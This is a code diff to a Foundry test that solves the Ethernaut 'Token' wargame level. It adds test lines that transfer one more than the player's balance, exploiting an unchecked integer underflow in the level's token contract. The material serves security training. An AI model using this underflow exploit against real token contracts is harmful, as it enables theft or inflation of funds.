@@ -10,6 +10,8 @@ import {Ethernaut} from "src/Ethernaut.sol";
 
 interface Token {
     function transfer(address, uint256) external returns (bool);
+
+    function balanceOf(address _owner) external view returns (uint256 balance);
 }
 
 contract TestToken is Test, Utils {
@@ -58,6 +60,13 @@ contract TestToken is Test, Utils {
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
+
+        uint256 balance = instance.balanceOf(address(player));
+        console2.log("player balance", balance);
+        // Transfer a greater amount than the player's balance, the contract didn't check underflow.
+        instance.transfer(address(this), balance + 1);
+        balance = instance.balanceOf(address(player));
+        console2.log("player balance", balance);
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
